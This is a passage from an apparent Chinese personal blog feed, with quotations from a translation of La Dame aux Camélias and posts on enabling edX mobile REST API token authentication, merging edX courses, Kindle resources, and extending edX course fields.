&lt;p&gt;少女越是相信善良就越是容易失身，如果不是失身于情人的话，至少是失身于爱情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就好像那些放高利贷的人，他们盘剥了成千的人，有一天他借了二十个法郎给一个快要饿死的穷人，没有要他付利息，没有逼着他写借据，就自以为罪已经赎清了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个男子有多么得意，因为他有权对她说，“您的爱情跟做买卖也差不离”。然而，这是一种残酷的权利&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这就像那些可怜的姑娘萌发了真正的爱情的时候一样。她们说谎次数太多，以致别人不再相信她们了，她们后悔莫及地葬身于她们自己的爱情之中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们都谴责那些为了女戏子和妓女而倾家荡产的人，使我奇怪的倒是，他们怎么没有更进一步地为这些女人做出更加荒唐的事来呢。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我希望自己能像一个百万富翁似地爱您，但是我力不从心；您希望我能像一个穷光蛋似地爱您，我却又不是那么一无所有。那么让我们大家都忘记了吧，对您来说是忘却一个几乎是无关紧要的名字，对我来说是忘却一个无法实现的美梦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我把这封信反复看了十来遍，想到这封信会使玛格丽特感到痛苦，我心里稍许平静了一些&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我也有一种迷信的想法，认为只要我出去一会儿，回来时就会看到回信。因为人们焦急地等待着的回信总是在收信人不在家的时候送到的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她唯一有希望在我身上得到的是一种真诚的感情。她的生活充满了商业性的爱情，这种真诚的感情能使她得到休息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有时候我们被迫牺牲肉体以换得精神上的满足&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们这些受命运摆布的女人，我们有一些古怪的愿望和不可思议的爱情。我们有时为了某一件事，有时候又为了另一件事而委身于人。有些人为我们倾家荡产，却一无所得，也有些人只用一束鲜花就换得了我们。我们凭一时高兴而随心所欲，这是我们仅有的消遣和唯一的借口。我委身于你比谁都快，这我可以向你起誓，为什么呢？因为你看到我吐血就握住我的手，还流了眼泪，因为你是唯一真正同情我的人。我要告诉你一个笑话：从前我有一只小狗，当我咳嗽的时候，它总是用悲哀的神气瞅着我，它是我唯一喜爱过的动物。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;它死的时候，我哭得比死了亲娘还要伤心，我的的确确挨了我母亲十二年的打骂。就这样，我一下子就爱上了你，就像爱上了我的狗一样。如果男人们都懂得用眼泪可以换到些什么，他们就会更讨人的喜爱，我们也不会这样挥霍他们的钱财了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;至于这些工厂枯燥无味的商业化特点，由于距离较远就无法看清了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们总是把乡村和爱情联系起来，这是很有道理的。没有比这明亮的田野或者寂静的树林里的蓝天、芳草、鲜花和微风更能和您心爱的女人相配了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;玛格丽特穿一件白色的长裙，斜依在我的胳臂上。晚上，在繁星点点的苍穹下，她向我反复絮叨着她前一天对我说的话&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这就是那天灼热的阳光穿过树叶的空隙给我带来的梦境。我们的游船停在一个孤岛上，我们躺在小岛的草地上，割断了过去的一切人间关系，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最纯洁的决心都会有一些庸俗可笑、但又是铁铸成的链索把它拴在这个地上，这些链索是不容易挣断的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;以便到了三十岁的时候，她们就可以为一个一无所有的情人这么个奢侈品而自己掏腰包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你爱我的话，你就让我用我的方式来爱你，不然的话，你就只能继续把我看成一个奢侈成性的姑娘，而老觉得不得不给我钱。你羞于接受我对你爱情的表白。你总是不由自主地想到总有一天要离开我，因此你小心翼翼，唯恐被人疑心，你是对的，我的朋友，但是我原来的希望还不仅于此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个人心中没有爱情的时候可以满足于虚荣，但一旦有了爱情，虚荣就变得庸俗不堪了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你无牵无挂，我自由自在，我们年纪还轻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她说的话，都是一个女人不愿意说真话时所提出的借口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;后来我稍许清醒了一些，我环视着周围，看到别人并不关心我的不幸，他们还是照常生活，我真奇怪透了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在经过我身旁的时候，她脸色发白，嘴唇抽了一下，浮现出一种痉挛性的微笑。而我呢，我的心剧烈地跳动，冲击着我的胸膛，但是我总算还保持了冷静的脸色，淡漠地向我过去的情妇弯了弯腰，她几乎立即就向马车走去，和她的女朋友一起坐了上去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;男人在他那狭隘的欲望受到伤害时，变得有多么渺小和卑鄙啊！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;玛格丽特的态度是安详而不轻蔑，尊严而不鄙视，这使我觉得她比我高尚，也促使我更加生她的气&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我眼下还算是一个漂亮姑娘，好好享用吧，但是别向我要求别的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是一封由我这样一个姑娘写的信，很可能被看作是满纸谎言；除非我死了，由于死亡的权威而使这封信神圣化；除非这不是一封普通的信，而是一份忏悔书，才会有人相信&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我只不过是一个妓女，不管我讲得多么有理，这种关系看起来总是像一种自私的打算；我过去的生活已经使我没有权利来梦想这样的未来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个我所得到的唯一真正纯洁的吻会给我战胜爱情的力量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;您以前对我的爱情已经把我的心灵向着崇高的激情打开了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;凡是一个女人的心里能够容纳得下和能够给人的爱情，我都拿出来给了您。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;您在远方，您在咒骂我，我得不到您一句安慰的话。但这是命运促成您这样遗弃我的，这我是深信不疑的，因为如果您在巴黎，您是不会离开我的床头和我的房间的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果我早知道在您未来的生活中我只要占您一年的时间，我可能不会放弃跟您一起度过这一年的愿望，至少我可以握着我朋友的手死去。不过如果我们在一起度过这一年，我也肯定不会死得这么快的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她活着的时候是一个罪人，但她将像一个基督徒那样死去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是我知道她们之中有一位姑娘，在她的一生中曾产生过一种严肃的爱情，她为了这个爱情遭受痛苦，直至死去。我把我听到的事讲给读者听，这是一种责任。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 17 Feb 2015 00:00:00 +0000</pubDate><guid>tag:,2015-02-17:book-La-traviata.html</guid><category>book</category></item><item><title>edX开源android和ios源码</title><link>/edx-app-android-ios.html</link><description>&lt;p&gt;edX今日公布android和ios的源码&lt;/p&gt;
&lt;h1&gt;移动端源码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-app-ios"&gt;edx-app-ios&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-app-android"&gt;edx-app-android&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关文档（包括后端接口）&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx-mobile-for-students.readthedocs.org/en/latest/SFD_mobileFAQ.html"&gt;edx-mobile-for-students&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/index.html"&gt;edx-platform-api&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;移动端取数据需要后端的支持，目前需要手动开启，预计之后会自动开启，可以参考我的这篇文章&lt;a href="http://wwj718.github.io/edx-mobile-api.html"&gt;让edx为手机端提供接口&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;参考资料]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-app-ios"&gt;edx-app-ios&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-app-android"&gt;edx-app-android&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx-mobile-for-students.readthedocs.org/en/latest/SFD_mobileFAQ.html"&gt;edx-mobile-for-students&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/index.html"&gt;edx-platform-api&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/mobile.html"&gt;Setting Up the Open edX Mobile Applications&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 15 Jan 2015 00:00:00 +0000</pubDate><guid>tag:,2015-01-15:edx-app-android-ios.html</guid><category>edx</category></item><item><title>让edx为手机端提供接口</title><link>/edx-mobile-api.html</link><description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;上周部署了edX最新的release版本（release-2014-11-19），想看看有什么新的特性。&lt;/p&gt;
&lt;p&gt;对比上回部署的版本release-2014-09-17，release-2014-11-19这个版本在部署的时候几乎不会遇到什么依赖问题。&lt;/p&gt;
&lt;p&gt;当然，如果你想部署在阿里云上，可能还是蛮折腾的，主要是网络的问题，你懂的。而阿里云上vpn似乎很难使用，反正我没有成功过，配置成功过的同学求指教。我的方案是使用sshuttle，sshuttle也可能导致ip被影藏，ssh无法连接。应对这种问题你可以在启用sshuttle之前，使用ngrok把ssh端口映射出来。更多细节参考&lt;a href="http://wwj718.github.io/use-ngrok.html"&gt;我之前的文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;release-2014-09-17部署的时候存在matplotlib依赖等问题。如果你部署的是release-2014-09-17版，建议移除edx_sandbox.yml中ora的安装。&lt;/p&gt;
&lt;p&gt;此外,release-2014-11-19相对于release-2014-09-17另一个明显的变化是移动端接口被合并进来了（似乎是9-25号之后并入master的。如果你想使用edx的MOBILE_REST_API，9-25之后的release应该都是包含的。&lt;/p&gt;
&lt;p&gt;顺便，再说一个可能潜在的问题。如果你设置了平台名字为中文（PLATFORM_NAME），那么你打开主讲教师tag时会出现500错误&lt;/p&gt;
&lt;p&gt;错误的原因是lms/envs/common.py中有这句：
&lt;code&gt;ANALYTICS_DASHBOARD_NAME = ENV_TOKENS.get("ANALYTICS_DASHBOARD_NAME", PLATFORM_NAME + " Insights")&lt;/code&gt; ，log显示是字符编码错误。简易的处理方法是把写死&lt;code&gt;ANALYTICS_DASHBOARD_NAME&lt;/code&gt;,比如&lt;code&gt;ANALYTICS_DASHBOARD_NAME="ANALYTICS_DASHBOARD"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在汉化或者定制过程中可能遇到许多这类小错误，处理的思路是查看log，定位到问题所在，就可以干掉bug了。适当结合grep之类的工具会事半功倍，之后的文章中我会说说折腾edx中我自己常用的工具。它们大多来自linux工具箱&lt;/p&gt;
&lt;h2&gt;开始&lt;/h2&gt;
&lt;p&gt;回到我们的主题，在此只记录我在release-2014-11-19上使用MOBILE_REST_API的过程。让其为移动端提供数据。&lt;/p&gt;
&lt;p&gt;ok，let's go&lt;/p&gt;
&lt;p&gt;本篇文章针对生产环境，开发环境有些不同&lt;/p&gt;
&lt;h2&gt;说明&lt;/h2&gt;
&lt;p&gt;edx的手机端接口需要身份验证（&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/authentication.html"&gt;edX API Authentication&lt;/a&gt;），&lt;/p&gt;
&lt;p&gt;我想使用基于Token的认证。 这一块是&lt;a href="http://www.django-rest-framework.org/"&gt;Django REST framework&lt;/a&gt;的内容，具体可参考&lt;a href="http://www.django-rest-framework.org/api-guide/authentication/"&gt;django-rest-framework authentication&lt;/a&gt;中的TokenAuthentication部分，如果你想使用基于session或者OAuth2的认证也是可以的，事实上默认的就是SessionAuthentication和OAuth2Authentication。&lt;/p&gt;
&lt;h2&gt;配置&lt;/h2&gt;
&lt;p&gt;MOBILE_REST_API默认并没有被启用，所以修改lms/envs/aws.py，启用它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;diff --git a/lms/envs/aws.py b/lms/envs/aws.py  首先在aws.py最后添加以下内容&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+FEATURES[&amp;#39;ENABLE_MOBILE_REST_API&amp;#39;] = True
+FEATURES[&amp;#39;ENABLE_VIDEO_ABSTRACTION_LAYER_API&amp;#39;] = True
+
+REST_FRAMEWORK = {
+    &amp;#39;DEFAULT_AUTHENTICATION_CLASSES&amp;#39;: (
+        &amp;#39;rest_framework.authentication.BasicAuthentication&amp;#39;,
+        &amp;#39;rest_framework.authentication.SessionAuthentication&amp;#39;,
+        &amp;#39;rest_framework.authentication.TokenAuthentication&amp;#39;,
+        &amp;#39;rest_framework.authentication.OAuth2Authentication&amp;#39;,
+    )
+}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;edx的手机端接口使用&lt;a href="http://www.django-rest-framework.org/"&gt;Django REST framework&lt;/a&gt;来写，我们所做的配置基本是&lt;a href="http://www.django-rest-framework.org/"&gt;Django REST framework&lt;/a&gt;的要求，跟edX关系不大。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;diff --git a/lms/envs/common.py b/lms/envs/common.py&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;INSTALLED_APPS = (

     # User API
     &amp;#39;rest_framework&amp;#39;,
+    &amp;#39;rest_framework.authtoken&amp;#39;,
     &amp;#39;user_api&amp;#39;,
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;为UserDetail接口函数增加Token验证&lt;/h2&gt;
&lt;p&gt;diff --git a/lms/djangoapps/mobile_api/users/views.py b/lms/djangoapps/mobile_api/users/views.py&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-from rest_framework.authentication import OAuth2Authentication, SessionAuthentication
+from rest_framework.authentication import OAuth2Authentication, SessionAuthentication,TokenAuthentication
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-    authentication_classes = (OAuth2Authentication, SessionAuthentication)
+    authentication_classes = (TokenAuthentication,OAuth2Authentication, SessionAuthentication)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;同理你也可以为其他接口函数做同样地工作。目前所有可以的接口如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Get &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/users.html#get-user-details"&gt;user details&lt;/a&gt; and &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/users.html#get-a-user-s-course-enrollments"&gt;course enrollments&lt;/a&gt; for a user.&lt;/li&gt;
&lt;li&gt;Get &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/course_info.html#get-the-course-about-page"&gt;course information&lt;/a&gt;, &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/course_info.html#get-course-updates"&gt;updates&lt;/a&gt;, and &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/course_info.html#get-course-handouts"&gt;handouts&lt;/a&gt; for courses the user is enrolled in.&lt;/li&gt;
&lt;li&gt;Get &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/video_outlines.html#get-the-video-list"&gt;videos&lt;/a&gt; and &lt;a href="http://edx-platform-api.readthedocs.org/en/latest/video_outlines.html#get-a-video-transcript"&gt;transcripts&lt;/a&gt; for courses the user is enrolled in.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;同步数据库&lt;/h2&gt;
&lt;p&gt;由于我们在INSTALLED_APPS中增加了rest_framework.authtoken，所以需要同步一下数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms --settings aws syncdb
sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms --settings aws migrate
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;重启生效&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;开始测试&lt;/h2&gt;
&lt;p&gt;好啦，万事具备，我们来测试一下新加的手机端接口吧。&lt;/p&gt;
&lt;h3&gt;获取Token&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms --settings aws shell


from rest_framework.authtoken.models import Token
from django.contrib.auth.models import User
user= User.objects.get(username=&amp;quot;wwj&amp;quot;)  #username填入你已注册的username
token = Token.objects.create(user=user)
print token.key
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;记下token.key的值，假设token是9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b，之后请求用户信息时需要携带它。&lt;/p&gt;
&lt;p&gt;在生产环境中，你需要自己写个获取token的函数，在用户身份验证后返回token给他，比如取名request_token之类的。之后手机端获得token后，每次携带这个令牌来请求数据就好了&lt;/p&gt;
&lt;h3&gt;获取用户详细信息&lt;/h3&gt;
&lt;p&gt;我们用curl去请求用户详细信息&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X GET http://127.0.0.1:8000/api/mobile/v0.5/users/ww -H &amp;#39;Authorization:Token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将获取以下内容&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;id&amp;quot;: 6, &amp;quot;username&amp;quot;: &amp;quot;wwj&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;wwj@qq.com&amp;quot;, &amp;quot;name&amp;quot;: &amp;quot;wwj&amp;quot;, &amp;quot;course_enrollments&amp;quot;: &amp;quot;http://127.0.0.1:8000/api/mobile/v0.5/users/ww/course_enrollments/&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;返回参数的意义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;id: 用户id&lt;/li&gt;
&lt;li&gt;username: 用户名&lt;/li&gt;
&lt;li&gt;email: 用户的email&lt;/li&gt;
&lt;li&gt;name: 用户的全名&lt;/li&gt;
&lt;li&gt;course_enrollments: 用户注册课程列表&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ok,一切正常&lt;/p&gt;
&lt;p&gt;以上只是粗粗地介绍了主要原理，如果你想在实际生产环境中使用，需要自己去完成一下request_token函数&lt;/p&gt;
&lt;h1&gt;参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/index.html"&gt;edx-platform-api&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/authentication/"&gt;django-rest-framework authentication&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Dec 2014 00:00:00 +0000</pubDate><guid>tag:,2014-12-03:edx-mobile-api.html</guid><category>edx</category></item><item><title>module-level import/export from edx - a hack</title><link>/edx-code.html</link><description>&lt;p&gt;最近折腾edx遇到些怪异的问题，于是去&lt;a href="https://groups.google.com/forum/#!forum/edx-code"&gt;edx-code&lt;/a&gt;寻求帮助，看到Armando Fox分享的这个hack方法挺有意思，分享过来给大家，也许有人用得着&lt;/p&gt;
&lt;p&gt;详细内容见&lt;a href="https://groups.google.com/forum/#!topic/edx-code/n_JEqe_GlXY"&gt;module-level import/export from edx - a hack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大体内容如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;i successfully did the following to append the contents of course B into course A: 

1.  exported dumps of A and B from Studio 
2.  un-tar each dump 
3.  copy all the leaf-level assets of course B into the correpsonding leaf folders of A, *except* i avoided assets where there was a filename collision (like course.xml).  i did this partly manually, partly using find, partly using &amp;#39;cp -i&amp;#39;. 
4.  in course A, edit the file course/*.xml (there will be only one): you will see it contains a line per &amp;quot;chapter&amp;quot;, which is a single flippy-triangle unit in the left-hand navbar.  into that file, copy all the &amp;lt;chapter&amp;gt; element lines from the course/*.xml file in course B. 
5.  tar up the result 
6.  import the result into Studio. 

voila, a course that is the append of A and B. 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;需求大概是：楼主需要将课程B导入到课程A中&lt;/p&gt;
&lt;p&gt;解决方案的大体思路就是，导出课程&amp;gt;解包&amp;gt;直接操控解压文件，合并内容&amp;gt;打包&amp;gt;导入。合并内容的时候注意3，4两点提到的具体合并细节&lt;/p&gt;
&lt;p&gt;楼主进一步说道， 只导入某些章节应该也是可能的，不过引用文件依赖可能比较琐碎麻烦，应该可以写个脚本来做。（很常见的需求）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;this should be a simple script to write if someone wants to take a whack at it.  (ideally this should be in the Studio GUI, but it's not.) &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我觉得完成这个工作，可以要参考这篇文章。关于我们如何不通过studio来操作课程内容&lt;/p&gt;
&lt;p&gt;&lt;a href="http://edx-open-learning-xml.readthedocs.org/en/latest/index.html"&gt;edX Open Learning XML Guide&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;关于edX Open Learning XML(OLX)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The edX Open Learning XML Guide provides the information you need to build an edX course through Open Learning XML (OLX) and supporting files, without using edX Studio.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就是说我们可以不用依赖Studio，自己来写制作课程的工具，当然前提是熟悉OLX(edX Open Learning XML Guide).这里边有极大的发挥空间&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 10 Nov 2014 00:00:00 +0000</pubDate><guid>tag:,2014-11-10:edx-code.html</guid><category>edx</category></item><item><title>kindle相关</title><link>/about-kindle.html</link><description>&lt;h3&gt;刚入手kindle paperwhite应该做哪些事情&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/22193869"&gt;http://www.zhihu.com/question/22193869&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;原生系统与多看系统&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20795407"&gt;http://www.zhihu.com/question/20795407&lt;/a&gt;  在大陆用 Kindle 电子书，原生系统和多看系统哪个更方便一些&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;如何更好地使用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20898821"&gt;http://www.zhihu.com/question/20898821&lt;/a&gt;  如何优雅地使用 Kindle ？     格式选择上尽量以epub，mobi和azw3为首选，少用非6寸PDF&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;把网页推送到kindle上看&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/send-to-kindle-by-klipme/ipkfnchcgalnafehpglfbommidgmalan"&gt;send-to-kindle-by-klipme&lt;/a&gt;  chrome插件  插件内有说明如何使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Kindle看文字版PDF和看扫描版PDF最优解决方案汇总&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_9d8ec4a30101dei8.html"&gt;http://blog.sina.com.cn/s/blog_9d8ec4a30101dei8.html&lt;/a&gt;   对技术书籍很实用&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;书籍资源&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://blog.sina.com.cn/s/blog_9d8ec4a301015v7m.html"&gt;http://blog.sina.com.cn/s/blog_9d8ec4a301015v7m.html&lt;/a&gt;  kindle电子书和新闻推送及RSS资源网站汇总&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.zhihu.com/question/20362711"&gt;http://www.zhihu.com/question/20362711&lt;/a&gt;  一些排版良好的资源&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 06 Nov 2014 00:00:00 +0000</pubDate><guid>tag:,2014-11-06:about-kindle.html</guid><category>kindle</category></item><item><title>在edX中为course扩充字段</title><link>/extend-edx-course.html</link><description>&lt;p&gt;之前在&lt;a href="https://groups.google.com/forum/#!forum/edx-code"&gt;edx code&lt;/a&gt;（edX google group）上问过如何为course扩充字段（如为课程添加category字段）。&lt;/p&gt;
&lt;p&gt;得到的回复说直接往CoueseFields里添加你要的字段就行。位置在&lt;code&gt;common/lib/xmodule/course_module.py&lt;/code&gt;.之后该字段会自动显示在Advanced Settings里。我按照这种方法发现字段的确成为course的属性了（在shell里实验)。不过并没有自动显示在Advanced Settings里，不晓得是不是版本问题。&lt;/p&gt;
&lt;p&gt;此外还有回复说他是采用org字段来存储课程分类。因为他们是内部使用edx,不需要org。不过这种方式总归不大好。&lt;/p&gt;
&lt;p&gt;前两天收到一封邮件，说他也想扩充课程，和我之前需求类似，希望给与帮助。&lt;/p&gt;
&lt;p&gt;看来这还是个挺常见的需求。&lt;/p&gt;
&lt;p&gt;我就分享下自己的方法好了。也讲下具体流程，而不仅是给出方案，这样小伙伴们下回遇到类似的问题，可以按照类似思路自己解决啦。&lt;/p&gt;
&lt;h3&gt;需求描述&lt;/h3&gt;
&lt;p&gt;常见的需求类似这样：给课程添加category字段，用于分类课程，在首页使用。&lt;/p&gt;
&lt;h3&gt;最初的方案&lt;/h3&gt;
&lt;ul&gt;
